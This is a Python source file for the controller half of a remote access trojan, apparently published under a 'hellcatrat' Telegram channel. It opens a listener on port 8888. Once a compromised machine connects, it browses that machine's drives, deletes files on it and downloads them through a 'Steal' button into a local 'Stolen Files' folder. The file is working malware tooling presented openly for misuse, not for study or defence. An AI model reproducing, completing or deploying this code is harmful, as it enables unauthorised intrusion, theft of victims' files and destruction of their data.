import socket 
import os
import customtkinter as ctk
from PIL import Image
from tkinter import messagebox
import threading
import ctypes
import webbrowser

scaleFactor = ctypes.windll.shcore.GetScaleFactorForDevice(0)

Server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
Server.bind(("0.0.0.0", 8888)) # Tu met ton port (tu peux mettre cque tu veux) et l'IP si besoin

EmptyLabel = None

Conn = None

def Listen():
    global Conn

    Explorer.title("[STATUS : Waiting for Connexions... ] [Tool by Noone -> https://t.me/hellcatrat]")
    Server.listen()
    Conn, Addr = Server.accept()
    Explorer.title(f"[STATUS : Connected to {Addr[0]}] [Tool by Noone -> https://t.me/hellcatrat]")

    threading.Thread(target=lambda: UpdatePath(CurrentDir), daemon=True).start()
    DirEntry.configure(state="normal")
    DirContent = GetDirContent("C:\\")

    if DirContent != None:
        for Element in DirContent:
            if Element.startswith("<folder>"):
                threading.Thread(target=AddFolder, args=(Element.replace("<folder>", ''),)).start()
            else:
                threading.Thread(target=AddFile, args=(Element.replace("<file>", ""),)).start()

Elements = []

CurrentFileFrame = None
CurrentDir = "C:\\"

ExtImg = {
    (".wav", ".mp4", ".mp3", "mkv"): "video.png",
    (".html",): "html.png",
    (".py", ".pyc", ".pyd"): "py.png",
    (".zip", ".7z", ".gz", ".rar"): "archive.png",
    (".exe", ".scr"): "executable.png",
    (".dll", ".sys"): "sys.png",
    (".bat",): "bat.png",
    (".c",): "c.png",
    (".cs",): "cs.png",
    (".cpp",): "cpp.png",
    (".otf", ".ttf"): "font.png",
    (".ini",): "ini.png",
    (".jar", ".vhd", ".vmdk"): "jar.png",
    (".java",): "java.png",
    (".js",): "js.png",
    (".md",): "md.png",
    (".ldb", ".mdb"): "mdb.png",
    (".ovpn",): "ovpn.png",
    (".pfx",): "pfx.png",
    (".php",): "php.png",
    (".pptx", ".ppsx"): "powerpoint.png",
    (".ps1", ".ps"): "powershell.png",
    (".rtf",): "rtf.png",
    (".sh",): "shell.png",
    (".png", ".webp", ".jpeg", ".jpg", ".gif"): "image.png",
    (".txt", ".log"): "text.png",
    (".docx",): "word.png",
    (".xlsx", ".xlsb", ".xlsm"): "excel.png",
    (".pdf",): "pdf.png"
}

def LoadImg(Path: str, Size: tuple[int, int]) -> ctk.CTkImage:
    return ctk.CTkImage(Image.open(Path), size=Size)

def AddFolder(Name: str) -> None:
    global CurrentDir

    def Enter(event, Frame: ctk.CTkFrame) -> None:
        Frame.configure(fg_color="#545454")

    def Leave(event, Frame: ctk.CTkFrame) -> None:
        Frame.configure(fg_color="#1b1b1b")

    Folder = ctk.CTkFrame(MainFrame, height=25, width=600, fg_color="#1b1b1b", corner_radius=3)
    Folder.pack(pady=1, padx=0)

    Folder.bind("<Enter>", lambda e: Enter(e, Folder))
    Folder.bind("<Leave>", lambda e: Leave(e, Folder))
    ToSend = CurrentDir[:len(CurrentDir) - 1] if CurrentDir.endswith("\\") else CurrentDir
    Folder.bind("<Double-Button-1>", lambda e: ChangeDir(ToSend + "\\" + Name))

    Elements.append(Folder)

    Icon = ctk.CTkLabel(Folder, text="", height=17, image=LoadImg(".\\Assets\\folder.png", (19, 19)))
    Icon.place(y=3, x=3)

    FolderName = ctk.CTkLabel(Folder, text=Name, font=('Arial', 15), text_color="white", height=15)
    FolderName.place(y=4, x=30)

    FolderName.bind("<Enter>", lambda e: Enter(e, Folder))
    FolderName.bind("<Leave>", lambda e: Leave(e, Folder))
    FolderName.bind("<Double-Button-1>", lambda e: ChangeDir(ToSend + "\\" + Name))

def AddFile(Name: str) -> None:
    global scaleFactor
    def Enter(event, Frame: ctk.CTkFrame) -> None:
        Frame.configure(fg_color="#545454")

    def Leave(event, Frame: ctk.CTkFrame) -> None:
        Frame.configure(fg_color="#1b1b1b")
    
    def FileOptionsMenu(event, Path: str) -> None:
        global CurrentFileFrame

        def DeleteFile(Path: str) -> None:
            Conn.send(f'<DelF>{Path}'.encode())

            Rsp = Conn.recv(1024).decode()

            if Rsp.startswith("<Error>"):
                messagebox.showerror("Explorer", f"Couldn't delete file : {Rsp.replace("<Error>", "")}")
            else:
                threading.Thread(target=lambda: messagebox.showinfo("Explorer", "File deleted.")).start()
                ChangeDir(CurrentDir)

        def StealFile(Path: str) -> None:
            Conn.send(f"<StealF>{Path}".encode())

            Rsp = b""

            while True:
                Data = Conn.recv(4096)
                Rsp += Data
                if b"<EndF>" in Rsp:
                    break
                            
            with open(f"..\\Stolen Files\\{os.path.basename(Path)}", "wb") as StolenF:
                StolenF.write(Rsp.replace(b"<EndF>", b""))

            messagebox.showinfo("Explorer", f"File stolen and located at .\\Stolen Files\\{os.path.basename(Path)}")

        if CurrentFileFrame != None:
            CurrentFileFrame.destroy()

        FileFrame = ctk.CTkFrame(Explorer, fg_color="#171717", height=425, width=125, corner_radius=5)
        FileFrame.place(y=65, x=660)

        CurrentFileFrame = FileFrame

        HasIcon = False

        NameOnly, Ext = os.path.splitext(Path)

        for ExtList in ExtImg.keys():
            if Ext in ExtList:
                Icon = ctk.CTkLabel(FileFrame, text="", height=25, image=LoadImg(f".\\Assets\\{ExtImg.get(ExtList)}", (75, 75)))
                Icon.place(y=20, x=25) 
                HasIcon = True
                break
        
        if not HasIcon:
            Icon = ctk.CTkLabel(FileFrame, text="", height=17, image=LoadImg(".\\Assets\\file.png", (75, 75)))
            Icon.place(y=20, x=25) 

        FileName = ctk.CTkLabel(FileFrame, text=os.path.basename(Path) if len(os.path.basename(Path)) <= 16 else os.path.basename(Path)[:13] + "...", font=("Arial", 14))
        FileName.place(y=115, relx=0.5, anchor='center')

        Delete_button = ctk.CTkButton(FileFrame, command=lambda: threading.Thread(target=lambda: DeleteFile(CurrentDir + "\\" + Name)).start(),text="Delete", fg_color="red", hover_color="dark red", corner_radius=3, height=25, width=100)
        Delete_button.place(y=150, x=12.5)

        Steal_button = ctk.CTkButton(FileFrame, command=lambda: threading.Thread(target=lambda: StealFile(CurrentDir + "\\" + Name)).start(),text="Steal", fg_color="#545454", hover_color="#464647", corner_radius=3, height=25, width=100)
        Steal_button.place(y=185, x=12.5)

    NameOnly, Ext = os.path.splitext(Name)

    HasIcon = False

    File = ctk.CTkFrame(MainFrame, height=25, width=600, fg_color="#1b1b1b", corner_radius=3)
    File.pack(pady=1, padx=0)

    Elements.append(File)

    for ExtList in ExtImg.keys():
        if Ext in ExtList:
            Icon = ctk.CTkLabel(File, text="", height=17, image=LoadImg(f".\\Assets\\{ExtImg.get(ExtList)}", (19, 19)))
            Icon.place(y=3, x=3)
            HasIcon = True
            break
    
    if not HasIcon:
        Icon = ctk.CTkLabel(File, text="", height=17, image=LoadImg(".\\Assets\\file.png", (19, 19)))
        Icon.place(y=3, x=3)

    File.bind("<Enter>", lambda e: Enter(e, File))
    File.bind("<Leave>", lambda e: Leave(e, File))
    File.bind("<Button-1>", lambda e: FileOptionsMenu(e, CurrentDir + "\\" + Name))

    FileName = ctk.CTkLabel(File, text=Name, font=('Arial', 15), text_color="white", height=15)
    FileName.place(y=4, x=30)

    FileName.bind("<Enter>", lambda e: Enter(e, File))
    FileName.bind("<Leave>", lambda e: Leave(e, File))
    FileName.bind("<Button-1>", lambda e: FileOptionsMenu(e, CurrentDir + "\\" + Name))

def UpdatePath(Path: str) -> None:
    DirEntry.delete(0, ctk.END)
    DirEntry.insert(0, Path)

def ClearExplorer() -> None:
    for Element in Elements:
        Element.destroy()

def ChangeDir(Dir: str) -> None:
    global CurrentDir

    if Dir == "C:":
        Dir = Dir + "\\"

    Content = GetDirContent(Dir)

    if Content != "NotFound" and Content != "NotDir":        
        ClearExplorer()
        MainFrame.update_idletasks()
        MainFrame._parent_canvas.yview_moveto(0)
        if Content != ["<Empty>"]:
            CurrentDir = Dir
            UpdatePath(CurrentDir)

            if len(Content) > 0:
                for Element in Content:  
                    if Element.startswith("<folder>"):
                        threading.Thread(target=AddFolder, args=(Element.replace("<folder>", ''),)).start()
                    else:
                        threading.Thread(target=AddFile, args=(Element.replace("<file>", ""),)).start()
        else:
            CurrentDir = Dir
            UpdatePath(CurrentDir)
            EmptyLabel = ctk.CTkLabel(MainFrame, text="This folder is empty.", font=("Arial", 25))
            EmptyLabel.pack(pady=5, padx=3)   
            Elements.append(EmptyLabel)   
    else:
        messagebox.showerror("Explorer", "Path not found")

def GetDirContent(Dir: str) -> list[str] | str:
    Conn.send(f"<ChDir>{Dir}".encode())

    Content = b""
    while True:
        part = Conn.recv(4096)
        Content += part
        if len(part) < 4096:
            break

    Content = Content.decode(errors="ignore")

    if Content == "<NotFound>":
        return "NotFound"
    elif Content == "<NotDir>":
        return "NotDir"
    else:
        return Content.splitlines()

Explorer = ctk.CTk(fg_color="#1b1b1b")
Explorer.geometry("800x500")
Explorer.maxsize(800, 500)
Explorer.iconbitmap(".\\Assets\\Window\\icon.ico")

DirEntry = ctk.CTkEntry(Explorer, state="disabled", width=730, height=30, fg_color="black", border_color="#545454", border_width=1, corner_radius=3)
DirEntry.place(y=10, x=25)

DirEntry.bind("<Return>", lambda e: ChangeDir(DirEntry.get()))

MainFrame = ctk.CTkScrollableFrame(Explorer, height=425, width=600, fg_color="#1b1b1b", corner_radius=5)
MainFrame.place(y=50, x=25)

threading.Thread(target=Listen, daemon=True).start()


Explorer.mainloop()
